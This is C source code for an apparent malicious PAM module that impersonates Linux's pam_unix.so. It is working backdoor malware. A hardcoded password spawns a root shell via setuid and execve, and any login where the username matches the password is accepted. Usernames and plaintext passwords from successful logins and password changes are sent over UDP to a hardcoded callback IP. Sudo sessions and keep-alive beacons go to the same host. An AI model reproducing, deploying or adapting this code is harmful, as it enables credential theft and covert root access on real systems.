#define _GNU_SOURCE
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdatomic.h>
#include <pwd.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <syslog.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <pthread.h>

// PAM module backup path
#define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
// Bypass Auth Password (setup in setup.py)
#define AUTH_PASSWORD "letredin"
#define WAIT_MAX 60
#define WAIT_MIN 30

// Callback IP, Port, and return format (setup in setup.py)
#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000
#define RET_FMT "%s - %s %s:%s\n"

typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);

// Helper function to get local IP address for use in the callback message
int get_local_ip(char *buffer, size_t buflen) {
    struct ifaddrs *ifaddr, *ifa;
    int family;
    
    if (getifaddrs(&ifaddr) == -1) {
        return -1;  // Failed to get interfaces
    }

    // Iterate over addresses and return not the loopback address
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        family = ifa->ifa_addr->sa_family;

        // Check for IPv4 (AF_INET) and ignore loopback interfaces
        if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            if (inet_ntop(AF_INET, &addr->sin_addr, buffer, buflen) != NULL) {
                freeifaddrs(ifaddr);
                return 0;  // Successfully found an IP
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;  // No suitable IP found
}

// Function to send data to the server (mainly username:password combinations)
int pam_send_authtok(const char *message, const char *username, const char *password) {

    // Get IP using helper function
    char ipaddr[INET_ADDRSTRLEN];
    if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
        return 1;
    }
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return 1;

    struct timeval timeout = { .tv_sec = 3, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(CALLBACK_PORT);
    inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

    char credentials[256];
    snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);

    // Send message via UDP (non-blocking with timeout)
    sendto(sock, credentials, strlen(credentials), 0,
           (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    close(sock);
    return 0;
}

// Send keep alive messages to server
void* pam_callback(void* arg) {
    srand(time(NULL));
    int rd_num = rand() % (WAIT_MAX - WAIT_MIN + 1) + WAIT_MIN;

    while(1) {
        pam_send_authtok("KEEP ALIVE", "", ":");
        sleep(rd_num);
    }

    return NULL;
}

// Function to dynamically link the real pam_unix.so to allow normal authentication
int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
    // Error handling (these really shouldn't matter)
    if (!name) {
        return PAM_AUTH_ERR;
    }
    if (!pamh) {
        return PAM_AUTH_ERR;
    }

    // Open handle 
    void *handle = dlopen(PAM_PATH, RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
        return PAM_AUTH_ERR;
    }

    // Get function from loaded module
    pam_func_t func = (pam_func_t)dlsym(handle, name);
    if (!func) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
        dlclose(handle);
        return PAM_AUTH_ERR;
    }

    int result = func(pamh, flags, argc, argv);
    //dlclose(handle);
    return result;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    // Get username and password from PAM handler
    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    // If password == AUTH_PASSWORD, give root shell
    if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
        setuid(0);
        setgid(0);
        // Prepare arguments for exec
        char *shell = "/bin/bash";
        char *args[] = {shell, "--login", NULL};

        // Replace the current session process with a root shell
        execve(shell, args, NULL);
        return PAM_SUCCESS;
    }

    // If authentication is successful, send creds to server using pam_send_authtok
    int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);

    // If the username is equal to the password and authentication hasn't already passed, pass it
    if (password && strlen(username) == strlen(password) && strncmp(username, password, strlen(username)) == 0 && retval != PAM_SUCCESS) {
        return PAM_SUCCESS;
    }

    if (username && password && retval == PAM_SUCCESS) {
        pam_send_authtok("USER AUTHENTICATED:", username, password);
    }

    return retval;
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    int retval = pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);

    // If password is successfully changed, send password using pam_send_authtok
    if (username && password && retval == PAM_SUCCESS) {
        pam_send_authtok("USER CHANGED PASSWORD:", username, password);
    }

    return retval;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_acct_mgmt", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;

    pam_get_user(pamh, &username, NULL);
 
    if (username) {
        // Get UID of the target user
        struct passwd *pw = getpwnam(username);
        uid_t target_uid = pw->pw_uid;

        // Get UID of the calling user
        uid_t caller_uid = getuid();
        struct passwd *caller_pw = getpwuid(caller_uid);
        const char *calling_user = caller_pw ? caller_pw->pw_name : "UNKNOWN";

        // If the target UID is 0 and the caller UID is greater than this, it must be a sudo session opening (user must be admin)
        if (target_uid == 0 && caller_uid > target_uid) {
            pam_send_authtok("SUDO SESSION OPENED:", calling_user, ":");
        }
    }

    return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
}

// Doesn't really matter for what this does (needs to be set though for proxy to work)
PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_close_session", pamh, flags, argc, argv);
}

// Doesn't really matter for what this does (needs to be set though for proxy to work)
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_setcred", pamh, flags, argc, argv);
}